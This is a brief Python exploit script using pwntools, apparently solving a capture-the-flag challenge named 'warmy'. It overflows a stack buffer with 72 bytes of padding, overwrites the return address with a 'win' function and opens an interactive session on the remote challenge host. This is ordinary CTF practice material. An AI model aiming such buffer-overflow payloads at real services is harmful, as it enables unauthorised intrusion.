#!/usr/bin/env python3
from pwn import *

HOST = "chall.kali-team.online"
PORT = 10023

context.binary = elf = ELF("./warmy", checksec=False)
context.log_level = "info"

offset = 72
win = elf.symbols["win"]

payload = b"A" * offset
payload += p64(win)

io = remote(HOST, PORT)
io.recvuntil(b"Hola!")
io.sendline(payload)
io.interactive()
